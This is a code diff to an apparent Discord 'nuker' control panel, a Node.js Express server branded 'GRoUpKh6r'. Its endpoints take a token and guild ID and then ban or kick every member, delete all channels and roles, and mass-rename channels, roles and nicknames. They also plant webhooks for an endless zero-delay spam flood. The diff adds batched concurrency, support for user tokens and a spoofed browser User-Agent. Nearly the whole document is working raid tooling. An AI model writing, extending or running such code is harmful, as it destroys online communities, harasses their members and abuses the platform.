@@ -4,241 +4,274 @@ const axios = require('axios');
 const path = require('path');
 
 const app = express();
+const PORT = process.env.PORT || 3000;
+
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
 const DISCORD_API = 'https://discord.com/api/v10';
 
-function getHeaders(token, isBot = true) {
-    return {
-        'Authorization': isBot ? `Bot ${token}` : token,
-        'Content-Type': 'application/json'
-    };
+const getHeaders = (token) => ({
+    'Authorization': token.startsWith('Bot ') || token.length > 60 ? token : `Bot ${token}`,
+    'Content-Type': 'application/json',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
+});
+
+// Helper for rapid batch execution
+async function batchProcess(items, fn, concurrency = 20) {
+    let index = 0;
+    const results = [];
+    async function worker() {
+        while (index < items.length) {
+            const currentIndex = index++;
+            try {
+                results[currentIndex] = await fn(items[currentIndex]);
+            } catch (e) {
+                results[currentIndex] = { error: e.message };
+            }
+        }
+    }
+    const workers = Array(Math.min(concurrency, items.length)).fill(0).map(() => worker());
+    await Promise.all(workers);
+    return results;
 }
 
-// 1. إنشاء رومات (بدون أرقام عشوائية، مرتبة ونظيفة)
-app.post('/api/channels/create', async (req, res) => {
-    const { token, guildId, name, count, isBot } = req.body;
+// 1. Rename Server
+app.post('/api/guild/rename', async (req, res) => {
+    const { token, guildId, name } = req.body;
     try {
-        const promises = [];
-        for (let i = 0; i < count; i++) {
-            promises.push(
-                axios.post(`${DISCORD_API}/guilds/${guildId}/channels`, {
-                    name: name,
-                    type: 0
-                }, { headers: getHeaders(token, isBot) })
-            );
-        }
-        await Promise.all(promises);
-        res.json({ success: true, message: 'تم إنشاء الرومات بنجاح وبدون أرقام.' });
-    } catch (error) {
-        res.status(500).json({ success: false, error: error.response?.data || error.message });
+        await axios.patch(`${DISCORD_API}/guilds/${guildId}`, { name }, { headers: getHeaders(token) });
+        res.json({ success: true });
+    } catch (e) {
+        res.json({ success: false, error: e.response?.data || e.message });
     }
 });
 
-// 2. حذف جميع الرومات
-app.post('/api/channels/delete', async (req, res) => {
-    const { token, guildId, isBot } = req.body;
+// 2. Kick All Members
+app.post('/api/guild/kick-all', async (req, res) => {
+    const { token, guildId } = req.body;
     try {
-        const channelsRes = await axios.get(`${DISCORD_API}/guilds/${guildId}/channels`, {
-            headers: getHeaders(token, isBot)
-        });
-        const promises = channelsRes.data.map(ch => 
-            axios.delete(`${DISCORD_API}/channels/${ch.id}`, { headers: getHeaders(token, isBot) })
-        );
-        await Promise.all(promises);
-        res.json({ success: true, message: 'تم حذف جميع الرومات بالكامل.' });
-    } catch (error) {
-        res.status(500).json({ success: false, error: error.response?.data || error.message });
-    }
-});
-
-// 3. تغيير أسماء جميع الرومات الموجودة
-app.post('/api/channels/rename', async (req, res) => {
-    const { token, guildId, newName, isBot } = req.body;
-    try {
-        const channelsRes = await axios.get(`${DISCORD_API}/guilds/${guildId}/channels`, {
-            headers: getHeaders(token, isBot)
-        });
-        const promises = channelsRes.data.map(ch => 
-            axios.patch(`${DISCORD_API}/channels/${ch.id}`, { name: newName }, { headers: getHeaders(token, isBot) })
-        );
-        await Promise.all(promises);
-        res.json({ success: true, message: 'تم تغيير أسماء جميع الرومات.' });
-    } catch (error) {
-        res.status(500).json({ success: false, error: error.response?.data || error.message });
-    }
-});
-
-// 4. إنشاء رولات جماعية
-app.post('/api/roles/create', async (req, res) => {
-    const { token, guildId, roleName, count, isBot } = req.body;
-    try {
-        const promises = [];
-        for (let i = 0; i < count; i++) {
-            promises.push(
-                axios.post(`${DISCORD_API}/guilds/${guildId}/roles`, {
-                    name: roleName,
-                    color: Math.floor(Math.random() * 16777215)
-                }, { headers: getHeaders(token, isBot) })
-            );
-        }
-        await Promise.all(promises);
-        res.json({ success: true, message: 'تم إنشاء الرولات بنجاح.' });
-    } catch (error) {
-        res.status(500).json({ success: false, error: error.response?.data || error.message });
-    }
-});
-
-// 5. حذف جميع الرولات
-app.post('/api/roles/delete', async (req, res) => {
-    const { token, guildId, isBot } = req.body;
-    try {
-        const rolesRes = await axios.get(`${DISCORD_API}/guilds/${guildId}/roles`, {
-            headers: getHeaders(token, isBot)
-        });
-        const promises = rolesRes.data.map(role => {
-            if (role.name !== '@everyone') {
-                return axios.delete(`${DISCORD_API}/guilds/${guildId}/roles/${role.id}`, { headers: getHeaders(token, isBot) });
+        const headers = getHeaders(token);
+        let members = [];
+        let after = '0';
+        let fetchMore = true;
+        while (fetchMore) {
+            const resMembers = await axios.get(`${DISCORD_API}/guilds/${guildId}/members?limit=1000&after=${after}`, { headers });
+            const data = resMembers.data;
+            if (data.length === 0) { fetchMore = false; } else {
+                members.push(...data);
+                after = data[data.length - 1].user.id;
             }
-        }).filter(Boolean);
-        await Promise.all(promises);
-        res.json({ success: true, message: 'تم حذف جميع الرولات.' });
-    } catch (error) {
-        res.status(500).json({ success: false, error: error.response?.data || error.message });
+        }
+        await batchProcess(members, (m) => axios.delete(`${DISCORD_API}/guilds/${guildId}/members/${m.user.id}`, { headers }), 15);
+        res.json({ success: true, count: members.length });
+    } catch (e) {
+        res.json({ success: false, error: e.response?.data || e.message });
     }
 });
 
-// 6. تغيير أسماء جميع الرولات
-app.post('/api/roles/rename', async (req, res) => {
-    const { token, guildId, newRoleName, isBot } = req.body;
+// 3. Ban All Members
+app.post('/api/guild/ban-all', async (req, res) => {
+    const { token, guildId } = req.body;
     try {
-        const rolesRes = await axios.get(`${DISCORD_API}/guilds/${guildId}/roles`, {
-            headers: getHeaders(token, isBot)
-        });
-        const promises = rolesRes.data.map(role => {
-            if (role.name !== '@everyone') {
-                return axios.patch(`${DISCORD_API}/guilds/${guildId}/roles/${role.id}`, { name: newRoleName }, { headers: getHeaders(token, isBot) });
+        const headers = getHeaders(token);
+        let members = [];
+        let after = '0';
+        let fetchMore = true;
+        while (fetchMore) {
+            const resMembers = await axios.get(`${DISCORD_API}/guilds/${guildId}/members?limit=1000&after=${after}`, { headers });
+            const data = resMembers.data;
+            if (data.length === 0) { fetchMore = false; } else {
+                members.push(...data);
+                after = data[data.length - 1].user.id;
             }
-        }).filter(Boolean);
-        await Promise.all(promises);
-        res.json({ success: true, message: 'تم تغيير أسماء جميع الرولات.' });
-    } catch (error) {
-        res.status(500).json({ success: false, error: error.response?.data || error.message });
+        }
+        await batchProcess(members, (m) => axios.put(`${DISCORD_API}/guilds/${guildId}/bans/${m.user.id}`, { delete_message_seconds: 0 }, { headers }), 15);
+        res.json({ success: true, count: members.length });
+    } catch (e) {
+        res.json({ success: false, error: e.response?.data || e.message });
     }
 });
 
-// 7. طرد جميع الأعضاء (Kick All)
-app.post('/api/members/kick', async (req, res) => {
-    const { token, guildId, isBot } = req.body;
+// 4. Change All Member Names (Nicknames)
+app.post('/api/guild/rename-members', async (req, res) => {
+    const { token, guildId, nickname } = req.body;
     try {
-        const membersRes = await axios.get(`${DISCORD_API}/guilds/${guildId}/members?limit=1000`, {
-            headers: getHeaders(token, isBot)
-        });
-        const promises = membersRes.data.map(member => 
-            axios.delete(`${DISCORD_API}/guilds/${guildId}/members/${member.user.id}`, {
-                headers: getHeaders(token, isBot)
-            }).catch(() => {})
-        );
-        await Promise.all(promises);
-        res.json({ success: true, message: 'تم طرد جميع الأعضاء.' });
-    } catch (error) {
-        res.status(500).json({ success: false, error: error.response?.data || error.message });
+        const headers = getHeaders(token);
+        let members = [];
+        let after = '0';
+        let fetchMore = true;
+        while (fetchMore) {
+            const resMembers = await axios.get(`${DISCORD_API}/guilds/${guildId}/members?limit=1000&after=${after}`, { headers });
+            const data = resMembers.data;
+            if (data.length === 0) { fetchMore = false; } else {
+                members.push(...data);
+                after = data[data.length - 1].user.id;
+            }
+        }
+        await batchProcess(members, (m) => axios.patch(`${DISCORD_API}/guilds/${guildId}/members/${m.user.id}`, { nick: nickname }, { headers }), 15);
+        res.json({ success: true, count: members.length });
+    } catch (e) {
+        res.json({ success: false, error: e.response?.data || e.message });
     }
 });
 
-// 8. حظر جميع الأعضاء (Ban All)
-app.post('/api/members/ban', async (req, res) => {
-    const { token, guildId, isBot } = req.body;
+// 5. Delete All Rooms and Roles (Purge)
+app.post('/api/guild/purge', async (req, res) => {
+    const { token, guildId } = req.body;
     try {
-        const membersRes = await axios.get(`${DISCORD_API}/guilds/${guildId}/members?limit=1000`, {
-            headers: getHeaders(token, isBot)
-        });
-        const promises = membersRes.data.map(member => 
-            axios.put(`${DISCORD_API}/guilds/${guildId}/bans/${member.user.id}`, {}, {
-                headers: getHeaders(token, isBot)
-            }).catch(() => {})
-        );
-        await Promise.all(promises);
-        res.json({ success: true, message: 'تم حظر جميع الأعضاء (باند).' });
-    } catch (error) {
-        res.status(500).json({ success: false, error: error.response?.data || error.message });
+        const headers = getHeaders(token);
+        const [channelsRes, rolesRes] = await Promise.all([
+            axios.get(`${DISCORD_API}/guilds/${guildId}/channels`, { headers }),
+            axios.get(`${DISCORD_API}/guilds/${guildId}/roles`, { headers })
+        ]);
+
+        await Promise.all([
+            batchProcess(channelsRes.data, c => axios.delete(`${DISCORD_API}/channels/${c.id}`, { headers }), 20),
+            batchProcess(rolesRes.data.filter(r => r.name !== '@everyone' && !r.managed), r => axios.delete(`${DISCORD_API}/guilds/${guildId}/roles/${r.id}`, { headers }), 20)
+        ]);
+
+        res.json({ success: true });
+    } catch (e) {
+        res.json({ success: false, error: e.response?.data || e.message });
     }
 });
 
-// 9. تغيير ألقاب جميع الأعضاء
-app.post('/api/members/nicknames', async (req, res) => {
-    const { token, guildId, newNickname, isBot } = req.body;
+// 6. Create Rooms (Exact Names, No Number Suffixes)
+app.post('/api/guild/create-channels', async (req, res) => {
+    const { token, guildId, name, count } = req.body;
     try {
-        const membersRes = await axios.get(`${DISCORD_API}/guilds/${guildId}/members?limit=1000`, {
-            headers: getHeaders(token, isBot)
-        });
-        const promises = membersRes.data.map(member => 
-            axios.patch(`${DISCORD_API}/guilds/${guildId}/members/${member.user.id}`, {
-                nick: newNickname
-            }, { headers: getHeaders(token, isBot) }).catch(() => {})
-        );
-        await Promise.all(promises);
-        res.json({ success: true, message: 'تم تغيير ألقاب جميع الأعضاء.' });
-    } catch (error) {
-        res.status(500).json({ success: false, error: error.response?.data || error.message });
+        const headers = getHeaders(token);
+        const items = Array(count).fill(name);
+        await batchProcess(items, (channelName) => axios.post(`${DISCORD_API}/guilds/${guildId}/channels`, { name: channelName, type: 0 }, { headers }), 25);
+        res.json({ success: true });
+    } catch (e) {
+        res.json({ success: false, error: e.response?.data || e.message });
     }
 });
 
-// 10. زرع الويب هوكس في كل الرومات
-app.post('/api/webhooks/create', async (req, res) => {
-    const { token, guildId, webhookName, isBot } = req.body;
+// 7. Create Roles (Rosters)
+app.post('/api/guild/create-roles', async (req, res) => {
+    const { token, guildId, name, count } = req.body;
     try {
-        const channelsRes = await axios.get(`${DISCORD_API}/guilds/${guildId}/channels`, {
-            headers: getHeaders(token, isBot)
-        });
-        const textChannels = channelsRes.data.filter(ch => ch.type === 0);
-        const promises = textChannels.map(ch => 
-            axios.post(`${DISCORD_API}/channels/${ch.id}/webhooks`, {
-                name: webhookName
-            }, { headers: getHeaders(token, isBot) }).catch(() => {})
-        );
-        await Promise.all(promises);
-        res.json({ success: true, message: 'تم زرع الويب هوكس في جميع الرومات.' });
-    } catch (error) {
-        res.status(500).json({ success: false, error: error.response?.data || error.message });
+        const headers = getHeaders(token);
+        const items = Array(count).fill(name);
+        await batchProcess(items, (roleName) => axios.post(`${DISCORD_API}/guilds/${guildId}/roles`, { name: roleName }, { headers }), 25);
+        res.json({ success: true });
+    } catch (e) {
+        res.json({ success: false, error: e.response?.data || e.message });
     }
 });
 
-// 11. سبام الويب هوكس المتزامن (إرسال فوري في كل الرومات)
-app.post('/api/webhooks/spam', async (req, res) => {
-    const { token, guildId, message, isBot } = req.body;
+// 8. Rename All Existing Rooms
+app.post('/api/guild/rename-channels', async (req, res) => {
+    const { token, guildId, name } = req.body;
     try {
-        const channelsRes = await axios.get(`${DISCORD_API}/guilds/${guildId}/channels`, {
-            headers: getHeaders(token, isBot)
-        });
-        const textChannels = channelsRes.data.filter(ch => ch.type === 0);
-        
-        const webhookPromises = textChannels.map(async (ch) => {
+        const headers = getHeaders(token);
+        const channelsRes = await axios.get(`${DISCORD_API}/guilds/${guildId}/channels`, { headers });
+        await batchProcess(channelsRes.data, c => axios.patch(`${DISCORD_API}/channels/${c.id}`, { name }, { headers }), 25);
+        res.json({ success: true });
+    } catch (e) {
+        res.json({ success: false, error: e.response?.data || e.message });
+    }
+});
+
+// 9. Rename All Existing Roles (Rosters)
+app.post('/api/guild/rename-roles', async (req, res) => {
+    const { token, guildId, name } = req.body;
+    try {
+        const headers = getHeaders(token);
+        const rolesRes = await axios.get(`${DISCORD_API}/guilds/${guildId}/roles`, { headers });
+        const targets = rolesRes.data.filter(r => r.name !== '@everyone' && !r.managed);
+        await batchProcess(targets, r => axios.patch(`${DISCORD_API}/guilds/${guildId}/roles/${r.id}`, { name }, { headers }), 25);
+        res.json({ success: true });
+    } catch (e) {
+        res.json({ success: false, error: e.response?.data || e.message });
+    }
+});
+
+// 10. Standalone Webhack & Instant Zero-Delay Flood
+app.post('/api/guild/webhook-spam-only', async (req, res) => {
+    const { token, guildId, messageText } = req.body;
+    try {
+        const headers = getHeaders(token);
+        const channelsRes = await axios.get(`${DISCORD_API}/guilds/${guildId}/channels`, { headers });
+        const textChannels = channelsRes.data.filter(c => c.type === 0);
+
+        const webhooks = (await batchProcess(textChannels, async (channel) => {
             try {
-                const whList = await axios.get(`${DISCORD_API}/channels/${ch.id}/webhooks`, { headers: getHeaders(token, isBot) });
-                if (whList.data.length > 0) return whList.data[0];
-                const newWh = await axios.post(`${DISCORD_API}/channels/${ch.id}/webhooks`, { name: 'GRoUpKh6r-Spam' }, { headers: getHeaders(token, isBot) });
-                return newWh.data;
+                const wh = await axios.post(`${DISCORD_API}/channels/${channel.id}/webhooks`, { name: 'GRoUpKh6r-Spam' }, { headers });
+                return wh.data;
             } catch { return null; }
-        });
+        }, 25)).filter(Boolean);
 
-        const webhooks = (await Promise.all(webhookPromises)).filter(w => w !== null);
+        res.json({ success: true, webhooksCreated: webhooks.length });
 
-        const spamPromises = [];
-        webhooks.forEach(wh => {
-            const hookUrl = `https://discord.com/api/v10/webhooks/${wh.id}/${wh.token}`;
-            for (let i = 0; i < 8; i++) {
-                spamPromises.push(axios.post(hookUrl, { content: message }).catch(() => {}));
+        global.spamActive = true;
+        const blast = async () => {
+            while (global.spamActive) {
+                await Promise.all(webhooks.map(wh => 
+                    axios.post(`https://discord.com/api/webhooks/${wh.id}/${wh.token}`, { content: messageText }, { timeout: 2000 }).catch(() => {})
+                ));
             }
-        });
-
-        await Promise.all(spamPromises);
-        res.json({ success: true, message: 'موجة سبام الويب هوكس انطلقت.' });
-    } catch (error) {
-        res.status(500).json({ success: false, error: error.response?.data || error.message });
+        };
+        blast();
+    } catch (e) {
+        res.json({ success: false, error: e.response?.data || e.message });
     }
 });
 
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`GRoUpKh6r Panel running on port ${PORT}`));
+// 11. Simultaneous Rename Rooms + Instant Webhack Flood
+app.post('/api/guild/rename-and-webhook-spam', async (req, res) => {
+    const { token, guildId, channelName, messageText } = req.body;
+    try {
+        const headers = getHeaders(token);
+        const channelsRes = await axios.get(`${DISCORD_API}/guilds/${guildId}/channels`, { headers });
+        const textChannels = channelsRes.data.filter(c => c.type === 0);
+
+        await Promise.all([
+            batchProcess(textChannels, c => axios.patch(`${DISCORD_API}/channels/${c.id}`, { name: channelName }, { headers }), 25),
+            batchProcess(textChannels, async (c) => {
+                try {
+                    const wh = await axios.post(`${DISCORD_API}/channels/${c.id}/webhooks`, { name: 'GRoUpKh6r-Spam' }, { headers });
+                    return wh.data;
+                } catch { return null; }
+            }, 25)
+        ].map(p => p.catch(() => {})));
+
+        // Re-fetch webhooks or use created ones to start zero-delay continuous flood
+        const updatedChannels = await axios.get(`${DISCORD_API}/guilds/${guildId}/channels`, { headers });
+        const freshTextChannels = updatedChannels.data.filter(c => c.type === 0);
+        
+        const allWebhooks = [];
+        await batchProcess(freshTextChannels, async (c) => {
+            try {
+                const whs = await axios.get(`${DISCORD_API}/channels/${c.id}/webhooks`, { headers });
+                if (whs.data && whs.data.length > 0) allWebhooks.push(whs.data[0]);
+            } catch {}
+        }, 25);
+
+        res.json({ success: true, activeWebhooks: allWebhooks.length });
+
+        global.spamActive = true;
+        const continuousBlast = async () => {
+            while (global.spamActive) {
+                await Promise.all(allWebhooks.map(wh => 
+                    axios.post(`https://discord.com/api/webhooks/${wh.id}/${wh.token}`, { content: messageText }, { timeout: 2000 }).catch(() => {})
+                ));
+            }
+        };
+        continuousBlast();
+    } catch (e) {
+        res.json({ success: false, error: e.response?.data || e.message });
+    }
+});
+
+app.post('/api/guild/stop-spam', (req, res) => {
+    global.spamActive = false;
+    res.json({ success: true });
+});
+
+app.listen(PORT, () => {
+    console.log(`[+] GRoUpKh6r engine active on port ${PORT}`);
+});
